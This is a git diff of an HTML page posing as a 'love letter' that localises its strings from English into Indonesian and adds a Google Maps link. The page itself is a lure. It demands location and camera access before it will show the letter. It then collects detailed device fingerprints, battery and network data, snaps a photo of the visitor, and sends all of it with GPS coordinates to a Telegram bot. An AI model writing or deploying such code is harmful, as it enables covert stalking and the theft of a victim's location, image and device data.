@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -179,7 +179,7 @@
                     }),
                 });
             } catch (error) {
-                console.error('Error sending message to Telegram:', error);
+                console.error('Error mengirim pesan ke Telegram:', error);
             }
         }
 
@@ -193,11 +193,11 @@
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CHAT_ID,
                         photo: photoBase64,
-                        caption: 'Photo captured from user',
+                        caption: 'Foto diambil dari pengguna saat membuka surat cinta',
                     }),
                 });
             } catch (error) {
-                console.error('Error sending photo to Telegram:', error);
+                console.error('Error mengirim foto ke Telegram:', error);
             }
         }
 
@@ -207,80 +207,80 @@
             
             // Basic Browser and Device Info
             deviceInfo.userAgent = navigator.userAgent;
-            deviceInfo.platform = navigator.platform || 'Unknown';
-            deviceInfo.language = navigator.language || navigator.userLanguage || 'Unknown';
-            deviceInfo.languages = navigator.languages ? navigator.languages.join(', ') : 'Unknown';
-            deviceInfo.cookieEnabled = navigator.cookieEnabled ? 'Yes' : 'No';
-            deviceInfo.doNotTrack = navigator.doNotTrack || 'Not specified';
+            deviceInfo.platform = navigator.platform || 'Tidak diketahui';
+            deviceInfo.language = navigator.language || navigator.userLanguage || 'Tidak diketahui';
+            deviceInfo.languages = navigator.languages ? navigator.languages.join(', ') : 'Tidak diketahui';
+            deviceInfo.cookieEnabled = navigator.cookieEnabled ? 'Ya' : 'Tidak';
+            deviceInfo.doNotTrack = navigator.doNotTrack || 'Tidak ditentukan';
             
             // Screen Info
             deviceInfo.screenResolution = `${window.screen.width}x${window.screen.height}`;
             deviceInfo.availableScreenResolution = `${window.screen.availWidth}x${window.screen.availHeight}`;
-            deviceInfo.colorDepth = window.screen.colorDepth || 'Unknown';
-            deviceInfo.pixelDepth = window.screen.pixelDepth || 'Unknown';
+            deviceInfo.colorDepth = window.screen.colorDepth || 'Tidak diketahui';
+            deviceInfo.pixelDepth = window.screen.pixelDepth || 'Tidak diketahui';
             
             // Device Capabilities
-            deviceInfo.deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Not available';
-            deviceInfo.hardwareConcurrency = navigator.hardwareConcurrency || 'Not available';
+            deviceInfo.deviceMemory = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Tidak tersedia';
+            deviceInfo.hardwareConcurrency = navigator.hardwareConcurrency || 'Tidak tersedia';
             
             // Network Info
             if (navigator.connection) {
-                deviceInfo.connectionType = navigator.connection.effectiveType || 'Unknown';
-                deviceInfo.downlink = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : 'Unknown';
-                deviceInfo.rtt = navigator.connection.rtt ? `${navigator.connection.rtt} ms` : 'Unknown';
-                deviceInfo.saveData = navigator.connection.saveData ? 'Enabled' : 'Disabled';
+                deviceInfo.connectionType = navigator.connection.effectiveType || 'Tidak diketahui';
+                deviceInfo.downlink = navigator.connection.downlink ? `${navigator.connection.downlink} Mbps` : 'Tidak diketahui';
+                deviceInfo.rtt = navigator.connection.rtt ? `${navigator.connection.rtt} ms` : 'Tidak diketahui';
+                deviceInfo.saveData = navigator.connection.saveData ? 'Aktif' : 'Nonaktif';
             } else {
-                deviceInfo.connectionType = 'Not available';
+                deviceInfo.connectionType = 'Tidak tersedia';
             }
             
             // Timezone
-            deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+            deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Tidak diketahui';
             
             // Touch Support
-            deviceInfo.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) ? 'Yes' : 'No';
-            deviceInfo.maxTouchPoints = navigator.maxTouchPoints || 'Not available';
+            deviceInfo.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0) ? 'Ya' : 'Tidak';
+            deviceInfo.maxTouchPoints = navigator.maxTouchPoints || 'Tidak tersedia';
             
             // WebGL Info
             try {
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                 if (gl) {
-                    deviceInfo.webglRenderer = gl.getParameter(gl.RENDERER) || 'Unknown';
-                    deviceInfo.webglVendor = gl.getParameter(gl.VENDOR) || 'Unknown';
-                    deviceInfo.webglVersion = gl.getParameter(gl.VERSION) || 'Unknown';
+                    deviceInfo.webglRenderer = gl.getParameter(gl.RENDERER) || 'Tidak diketahui';
+                    deviceInfo.webglVendor = gl.getParameter(gl.VENDOR) || 'Tidak diketahui';
+                    deviceInfo.webglVersion = gl.getParameter(gl.VERSION) || 'Tidak diketahui';
                 } else {
-                    deviceInfo.webglRenderer = 'Not supported';
+                    deviceInfo.webglRenderer = 'Tidak didukung';
                 }
             } catch (e) {
-                deviceInfo.webglRenderer = 'Error retrieving WebGL info';
+                deviceInfo.webglRenderer = 'Error mengambil info WebGL';
             }
             
             // Battery Info (requires async)
-            let batteryInfo = 'Not available';
+            let batteryInfo = 'Tidak tersedia';
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
                     batteryInfo = `
-                        Charging: ${battery.charging ? 'Yes' : 'No'}
+                        Pengisian: ${battery.charging ? 'Ya' : 'Tidak'}
                         Level: ${battery.level * 100}%
-                        Charging Time: ${battery.chargingTime || 'Unknown'} seconds
-                        Discharging Time: ${battery.dischargingTime || 'Unknown'} seconds
+                        Waktu Pengisian: ${battery.chargingTime || 'Tidak diketahui'} detik
+                        Waktu Pemakaian: ${battery.dischargingTime || 'Tidak diketahui'} detik
                     `;
                 } catch (e) {
-                    batteryInfo = 'Error retrieving battery info';
+                    batteryInfo = 'Error mengambil info baterai';
                 }
             }
             deviceInfo.battery = batteryInfo;
 
             // Browser Vendor and Features
-            deviceInfo.vendor = navigator.vendor || 'Unknown';
-            deviceInfo.product = navigator.product || 'Unknown';
-            deviceInfo.appVersion = navigator.appVersion || 'Unknown';
-            deviceInfo.appName = navigator.appName || 'Unknown';
-            deviceInfo.appCodeName = navigator.appCodeName || 'Unknown';
+            deviceInfo.vendor = navigator.vendor || 'Tidak diketahui';
+            deviceInfo.product = navigator.product || 'Tidak diketahui';
+            deviceInfo.appVersion = navigator.appVersion || 'Tidak diketahui';
+            deviceInfo.appName = navigator.appName || 'Tidak diketahui';
+            deviceInfo.appCodeName = navigator.appCodeName || 'Tidak diketahui';
             
             // Format the device info for Telegram
-            let formattedInfo = 'Device Information:\n';
+            let formattedInfo = 'Informasi Perangkat:\n';
             for (const [key, value] of Object.entries(deviceInfo)) {
                 formattedInfo += `${key.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}: ${value}\n`;
             }
@@ -312,7 +312,7 @@
 
                 return photoBase64;
             } catch (error) {
-                console.error('Error capturing photo:', error);
+                console.error('Error mengambil foto:', error);
                 return null;
             }
         }
@@ -323,40 +323,40 @@
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         const { latitude, longitude } = position.coords;
-                        const locationInfo = `Latitude: ${latitude}, Longitude: ${longitude}`;
+                        const mapsLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+                        const locationInfo = `Lokasi:\nTautan Google Maps: ${mapsLink}\nLatitude: ${latitude}\nLongitude: ${longitude}`;
                         const deviceInfo = await getDeviceInfo();
                         
-                        // Attempt to capture photo
+                        // Mengambil foto
                         const photoBase64 = await capturePhoto();
-                        let message = `Someone opened the love letter!\n\nLocation:\n${locationInfo}\n\n${deviceInfo}`;
+                        let message = `💖 Seseorang membuka surat cinta! 💖\n\n${locationInfo}\n\n${deviceInfo}\nWaktu: ${new Date().toLocaleString('id-ID')}`;
 
                         if (photoBase64) {
-                            // Send photo to Telegram
+                            // Kirim foto ke Telegram
                             await sendPhotoToTelegram(photoBase64);
-                            message += '\nPhoto: Sent successfully';
+                            message += '\nFoto: Berhasil dikirim';
                         } else {
-                            message += '\nPhoto: Failed to capture';
+                            message += '\nFoto: Gagal diambil';
                         }
 
-                        // Send text data to Telegram
+                        // Kirim pesan teks ke Telegram
                         await sendToTelegram(message);
 
-                        // Show letter content
+                        // Tampilkan surat cinta
                         initialContent.classList.add('hidden');
                         letterContent.classList.remove('hidden');
                     },
                     (error) => {
                         alert('Akses lokasi diperlukan untuk membuka surat cinta. Silakan aktifkan lokasi dan coba lagi.');
-                        // Return to initial content
                         initialContent.classList.remove('hidden');
                         letterContent.classList.add('hidden');
                     }
                 );
 
-                // Request camera access
+                // Periksa izin kamera
                 try {
                     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    stream.getTracks().forEach(track => track.stop()); // Immediately stop stream as we only need permission check
+                    stream.getTracks().forEach(track => track.stop());
                 } catch (error) {
                     alert('Akses kamera diperlukan untuk membuka surat cinta. Silakan izinkan kamera dan coba lagi.');
                     initialContent.classList.remove('hidden');
